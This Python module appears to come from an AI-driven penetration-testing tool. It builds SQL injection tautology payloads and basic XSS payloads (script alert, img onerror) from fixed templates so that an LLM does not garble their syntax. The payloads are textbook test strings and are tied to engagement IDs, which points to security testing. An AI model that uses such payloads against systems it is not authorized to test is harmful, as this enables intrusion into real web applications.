"""
V4.1 Payload Validation Framework
Deterministic builders to prevent LLM syntax hallucination.
"""

import hashlib
from dataclasses import dataclass
from enum import Enum
from typing import Dict, List

from ai_osop.core.config import VulnClass
from ai_osop.core.models import Payload


class PayloadStrategy(str, Enum):
    DIRECT = "direct"
    MUTATED = "mutated"
    POLYGLOT = "polyglot"


@dataclass
class PayloadTemplate:
    vuln_type: VulnClass
    template: str
    placeholders: List[str]
    description: str


PAYLOAD_TEMPLATES = {
    VulnClass.SQLI: [
        PayloadTemplate(
            vuln_type=VulnClass.SQLI,
            template="' OR '$val'='$val",
            placeholders=["val"],
            description="Classic tautology SQLi",
        ),
        PayloadTemplate(
            vuln_type=VulnClass.SQLI,
            template="') OR ('$val'='$val",
            placeholders=["val"],
            description="Classic tautology SQLi with parentheses",
        ),
    ],
    VulnClass.XSS: [
        PayloadTemplate(
            vuln_type=VulnClass.XSS,
            template="<script>alert('$msg')</script>",
            placeholders=["msg"],
            description="Basic script alert",
        ),
        PayloadTemplate(
            vuln_type=VulnClass.XSS,
            template="<img src=x onerror=alert('$msg')>",
            placeholders=["msg"],
            description="Event handler alert",
        ),
    ],
}


class PayloadBuilder:
    """
    Deterministic builder that compiles payloads from templates.
    """

    @staticmethod
    def build(
        template_id: int, vuln_type: VulnClass, values: Dict[str, str], engagement_id: str
    ) -> Payload:
        """
        Compile a payload using a template and values.
        """
        templates = PAYLOAD_TEMPLATES.get(vuln_type, [])
        if not templates or template_id >= len(templates):
            raise ValueError(f"Template not found for {vuln_type}")

        template = templates[template_id]
        content = template.template
        for key, val in values.items():
            content = content.replace(f"${key}", val)

        # Validation logic (Simple example)
        if vuln_type == VulnClass.XSS:
            if "<script>" in content and "</script>" not in content:
                raise ValueError("Broken script tag detected in payload")

        content_hash = hashlib.sha256(content.encode()).hexdigest()

        return Payload(
            vuln_type=vuln_type,
            content=content,
            content_hash=content_hash,
            strategy="deterministic_template",
            engagement_id=engagement_id,
            context={"template_description": template.description, "values": values},
        )
